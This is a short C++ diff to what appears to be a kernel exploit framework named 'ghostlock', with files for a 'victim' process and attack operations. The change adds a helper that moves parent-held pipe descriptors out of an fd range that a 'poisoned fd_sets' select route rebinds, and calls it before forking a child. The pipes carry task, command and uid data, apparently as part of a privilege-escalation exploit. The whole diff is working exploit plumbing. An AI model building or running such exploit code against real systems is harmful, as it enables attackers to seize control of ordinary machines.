@@ -7,6 +7,7 @@
 #include "session/victim_process.hpp"
 
 #include "attack/ops.hpp"
+#include "kernel/constants.hpp"
 #include "support/native_resource.hpp"
 
 #include <array>
@@ -166,6 +167,19 @@ namespace ghostlock::session::victim {
         park_child_process_forever();
     }
 
+    /* The select route rebinds every fd < PSELECT_ROUTE_NFDS whose bit is set
+     * in the poisoned fd_sets: move the parent-held ends out of that range. */
+    static void move_fd_above_route_range(support::UniqueFd &fd) {
+        if (!fd.valid()) return;
+        const int32_t high = fcntl(fd.get(), F_DUPFD_CLOEXEC,
+                                   static_cast<int32_t>(kernel::PSELECT_ROUTE_NFDS) + 64);
+        if (high < 0) {
+            pr_warning("protocol fd %d F_DUPFD failed errno=%d\n", fd.get(), errno);
+            return;
+        }
+        fd.reset(high);
+    }
+
     static pid_t spawn_child(VictimContext &p) {
         std::array<int32_t, 2> p1{}, p2{}, p3{};
         if (pipe(p1.data()) < 0 || pipe(p2.data()) < 0 || pipe(p3.data()) < 0) return -1;
@@ -175,6 +189,9 @@ namespace ghostlock::session::victim {
         p.cmd_write.reset(p2[1]);
         p.uid_read.reset(p3[0]);
         p.uid_write.reset(p3[1]);
+        move_fd_above_route_range(p.task_read);
+        move_fd_above_route_range(p.cmd_write);
+        move_fd_above_route_range(p.uid_read);
         pid_t child = fork();
         if (child < 0) return -1;
         if (child == 0) {
